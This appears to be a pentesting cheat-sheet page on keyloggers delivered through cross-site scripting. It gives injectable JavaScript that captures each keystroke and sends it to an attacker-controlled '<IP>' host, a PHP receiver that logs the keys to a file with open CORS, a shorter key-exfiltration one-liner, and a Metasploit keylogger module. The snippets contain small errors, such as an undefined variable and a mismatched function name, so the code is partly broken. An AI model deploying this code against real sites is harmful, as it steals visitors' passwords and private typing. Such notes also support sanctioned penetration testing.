# Keyloggers

Search Tag(s): #helpers #webapp-pentesting #cross-site-scripting

## 01 - Server-Side

### 1.1 - PHP

```php
/*
To inject the keylogger:

</script>
document.onkeypress = function(evt) {
    evt = evt || window.event;
    const keystroke = String.fromCharCode(evt.charCode);
    if(key) {
        const parameter = encodeURI(keystroke);
        fetch("http[s]://<IP>/keylogger.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"            
            },
            body: "key=" + parameter
        });
    }
}
</script>
*/

<?php
header("Access-Control-Allow-Origin: *");
if(!empty($_POST['key'])) {
    $log = fopen('keylog.txt', 'a+');
    fwrite($log, $_POST['key']);
    fclose($log);
}
?>
```

### 1.2 - JavaScript

```js
function sendKey(event) {
	fetch("http[s]://<IP>/data?k=" + event.key);
}
document.addEventListener('keydown', sendkey);
```

## 02 - Metasploit

TODO: Fill this info

```
msf > use auxiliary/server/capture/http_javascript_keylogger

msf auxiliary(server/capture/http_javascript_keylogger) > options
```

---
## References

- [IMVK: Cross Site Scripting â€“ Exploitation ](https://imvk.net/en/infosec/ethical-web-hacking/cross-site-scripting-exploitation)

- [Geeky much: Cross-site Scripting](https://medium.com/secure-you/cross-site-scripting-b64f440ae060)

- [Rapid7: Metasploit Framework - JavaScript Keylogger](https://www.rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/)